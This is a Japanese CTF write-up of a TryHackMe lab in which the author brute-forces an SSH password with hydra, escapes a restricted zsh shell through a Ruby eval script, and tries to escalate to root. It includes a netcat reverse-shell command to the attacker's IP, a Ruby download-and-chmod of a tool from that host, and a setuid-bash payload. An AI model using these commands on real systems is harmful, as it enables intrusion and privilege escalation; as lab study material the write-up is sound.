# Red Stone One Carat CTF

https://tryhackme.com/room/redstoneonecarat

## Enumeration

```shell
TARGET=10.48.183.14
sudo bash -c "echo $TARGET   red >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
```

SSHだけ。

問題文から、norajユーザーのパスワードブルートフォースをすることが分かる。

## SSHブルートフォース

ヒントから、パスワードには bu が含まれている。

```sh
root@ip-10-48-83-0:~# cat /usr/share/wordlists/rockyou.txt | grep bu > rockyou_bu.txt

root@ip-10-48-83-0:~# hydra -l noraj -P ./rockyou_bu.txt $TARGET ssh -t 30
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-23 01:43:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 126339 login tries (l:1/p:126339), ~4212 tries per task
[DATA] attacking ssh://10.48.183.14:22/
[22][ssh] host: 10.48.183.14   login: noraj   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 14 final worker threads did not complete until end.
[ERROR] 14 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-23 01:44:55
```

## rzsh

rzshという制限付きシェル

```sh
red-stone-one-carat% echo $0
rzsh
```

バイパスを目指す。

https://exploit-notes.hdks.org/exploit/network/protocol/restricted-shell-bypass/

エクスポートは封じられている。

```sh
red-stone-one-carat% export SHELL=/bin/bash
export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
export: SHELL: restricted
```

TABキー押下によるカレントディレクトリのファイル表示失敗

```sh
red-stone-one-carat% ./.
_main_complete:local:11: IFS: restricted
```

cpもない

```sh
red-stone-one-carat% cp /bin/bash .
zsh: command not found: cp
```

echoによるファイルリストは可能

```sh
red-stone-one-carat% echo /*
/bin /boot /dev /dummy.sh /etc /home /initrd.img /initrd.img.old /lib /lib64 /lost+found /media /mnt /opt /proc /root /run /sbin /snap /srv /sys /tmp /usr /var /vmlinuz /vmlinuz.old

red-stone-one-carat% echo /home/noraj/*
/home/noraj/bin /home/noraj/user.txt
```

```sh
red-stone-one-carat% echo /home/noraj/bin/*
/home/noraj/bin/rzsh /home/noraj/bin/test.rb
```

printf で隠しファイルが出てきた。

```sh
red-stone-one-carat% printf '%s\n' *(D)
bin
.cache
.hint.txt
user.txt
.zcompdump.red-stone-one-carat.2751
.zshrc
```

ファイルを読む

```sh
red-stone-one-carat% while read line; do echo $line; done < /home/noraj/user.txt; echo $line
THM{[REDACTED]}
```

## 権限昇格

ヒント。ローカルサービスに注目。

```sh
red-stone-one-carat% while read line; do echo $line; done < /home/noraj/.hint.txt; echo $line
Maybe take a look at local services.
```

rubyファイル

```ruby
red-stone-one-carat% while read line; do echo $line; done < /home/noraj/bin/test.rb; echo $line
#!/usr/bin/ruby

require 'rails'

if ARGV.size == 3
klass = ARGV[0].constantize
obj = klass.send(ARGV[1].to_sym, ARGV[2])
else
puts File.read(__FILE__)
end
```

引数無しで実行するとファイル自身を表示する。

```sh
red-stone-one-carat% test.rb
#!/usr/bin/ruby

require 'rails'

if ARGV.size == 3
    klass = ARGV[0].constantize
    obj = klass.send(ARGV[1].to_sym, ARGV[2])
else
    puts File.read(__FILE__)
end
```

ruby の send メソッドは、レシーバの持っているメソッドを呼び出す。  
引数が2つの場合、1つ目がメソッド、2つ目が引数。

下記で実行されないかと思ったが不発。  
（後になって気づいたが、そもそもsleepコマンドが存在していなかった）

```sh
red-stone-one-carat% test.rb Kernel system "sleep 5"
```

下記の形でコマンド実行できた。

```sh
red-stone-one-carat% test.rb Object eval "exec('/usr/bin/sudo -l')"
[sudo] password for noraj: 
Sorry, user noraj may not run sudo on red-stone-one-carat.
```

シェルの制限は回避できたが、それとは別にファイルごとのパーミッションが厳しく設定されている。

```sh
red-stone-one-carat% test.rb Object eval "exec('/bin/bash')"
Traceback (most recent call last):
        3: from /home/noraj/bin/test.rb:7:in `<main>'
        2: from /home/noraj/bin/test.rb:7:in `eval'
        1: from (eval):1:in `<main>'
/home/noraj/bin/test.rb:7:in `eval': Permission denied - /bin/bash (Errno::EACCES)
```

netcat は禁止されておらず接続もできているが、sh などのパーミッションがないため成功しない。

```sh
red-stone-one-carat% test.rb Object eval "exec('/bin/netcat 192.168.138.236 8888 -e /bin/sh')"
exec /bin/sh failed : Permission denied
```

サービス一覧

```sh
red-stone-one-carat% test.rb Object eval "exec('/bin/systemctl list-units --type=service --state=running')"
UNIT                       LOAD   ACTIVE SUB     DESCRIPTION                                 
accounts-daemon.service    loaded active running Accounts Service                            
amazon-ssm-agent.service   loaded active running amazon-ssm-agent                            
atd.service                loaded active running Deferred execution scheduler                
cron.service               loaded active running Regular background program processing daemon
dbus.service               loaded active running D-Bus System Message Bus                    
dummy.service              loaded active running Dummy apps                                  
getty@tty1.service         loaded active running Getty on tty1                               
haveged.service            loaded active running Entropy daemon using the HAVEGE algorithm   
ifplugd.service            loaded active running LSB: Brings up/down network automatically   
irqbalance.service         loaded active running irqbalance daemon                           
lvm2-lvmetad.service       loaded active running LVM2 metadata daemon                        
lxcfs.service              loaded active running FUSE filesystem for LXC                     
polkit.service             loaded active running Authorization Manager                       
root-app.service           loaded active running Root app                                    
rsyslog.service            loaded active running System Logging Service                      
serial-getty@ttyS0.service loaded active running Serial Getty on ttyS0                       
ssh.service                loaded active running OpenBSD Secure Shell server                 
systemd-journald.service   loaded active running Journal Service                             
systemd-logind.service     loaded active running Login Service                               
systemd-networkd.service   loaded active running Network Service                             
systemd-resolved.service   loaded active running Network Name Resolution                     
systemd-udevd.service      loaded active running udev Kernel Device Manager                  
user@1001.service          loaded active running User Manager for UID 1001                   

LOAD   = Reflects whether the unit definition was properly loaded.
ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
SUB    = The low-level unit activation state, values depend on unit type.

23 loaded units listed. Pass --all to see loaded but inactive units, too.
To show all installed unit files use 'systemctl list-unit-files'.
```

root-app サービスが ruby で実行しているが内容は不明。

```sh
red-stone-one-carat% test.rb Object eval "exec('/bin/systemctl cat root-app.service')"
# /etc/systemd/system/root-app.service
[Unit]
Description=Root app
# After=network.target

[Service]
User=root
ExecStart=/usr/bin/ruby /root/server.rb
Restart=on-failure

[Install]
WantedBy=multi-user.target% 
```

vagrant ユーザーなら変更が可能か。

```sh
red-stone-one-carat% test.rb Object eval "exec('/bin/ls -al /etc/systemd/system')"        
total 64
...
-rwxr-xr--  1 vagrant vagrant  168 May 17  2021 root-app.service
...
```

irbを起動できる。

```sh
red-stone-one-carat% test.rb Object eval "exec('/usr/bin/irb')"
```

wgetやchmodと同等のことは可能。

```sh
require 'net/http'
require 'uri'

uri = URI("http://192.168.138.236:8000/pspy64")
data = Net::HTTP.get(uri)

File.write("/tmp/pspy64", data)

File.chmod(0755, "/tmp/pspy64")
```

下記のようなvagrant の ncプロセスが大量に存在する。

```sh
2025/12/23 05:08:12 CMD: UID=1000  PID=1851   | nc -nlp 31000 -s 127.0.0.1 
2025/12/23 05:08:12 CMD: UID=1000  PID=1850   | nc -nlp 30999 -s 127.0.0.1 
2025/12/23 05:08:12 CMD: UID=1000  PID=1849   | nc -nlp 30998 -s 127.0.0.1 
2025/12/23 05:08:12 CMD: UID=1000  PID=1848   | nc -nlp 30997 -s 127.0.0.1 
2025/12/23 05:08:12 CMD: UID=1000  PID=1847   | nc -nlp 30996 -s 127.0.0.1 
2025/12/23 05:08:12 CMD: UID=1000  PID=1846   | nc -nlp 30995 -s 127.0.0.1 
2025/12/23 05:08:12 CMD: UID=1000  PID=1845   | nc -nlp 30994 -s 127.0.0.1 
2025/12/23 05:08:12 CMD: UID=1000  PID=1844   | nc -nlp 30993 -s 127.0.0.1 
2025/12/23 05:08:12 CMD: UID=1000  PID=1843   | nc -nlp 30992 -s 127.0.0.1 
2025/12/23 05:08:12 CMD: UID=1000  PID=1842   | nc -nlp 30991 -s 127.0.0.1 
```

netcat で接続はできるが何も反応がない。

```sh
red-stone-one-carat% test.rb Object eval "exec('/bin/netcat 127.0.0.1 30999')"
```

ここでギブアップしてウォークスルーを見た。

https://gist.githubusercontent.com/kwilczynski/954046/raw/4571a1eed62c4f13d0a2c70c5cf5ebd45e41004e/netstat.rb を使ったら 31547 ポートがリッスンしていることが分かって、そこにncで接続するという流れらしいが、実際やってみるとダミー多数のため31547をどう見つけ出すのか不明。

また、ウォークスルーによると下記のようなやり方が成立したらしいが、

```sh
red-stone-one-carat% test.rb Kernel 'system' "/bin/sh"
$ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

実際やると動作しなかった。

```sh
red-stone-one-carat% test.rb Kernel 'system' "/bin/sh"
red-stone-one-carat% export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export: PATH: restricted
```

最終的にこうするらしい。rubyコマンドに setUIDが付いているということだと思うが・・・

```sh
$ nc localhost 31547                                      
$ exec %q!cp /bin/bash /tmp/bash; chmod +s /tmp/bash!  
```

## 振り返り

- 前半は少し勉強になった。
- root昇格以降については、BOXの動作が変わったのか、ウォークスルーで書かれている操作が大体機能していないので壊れていると思う。

## Tags

#tags:ruby #tags:rzsh #tags:制限シェル
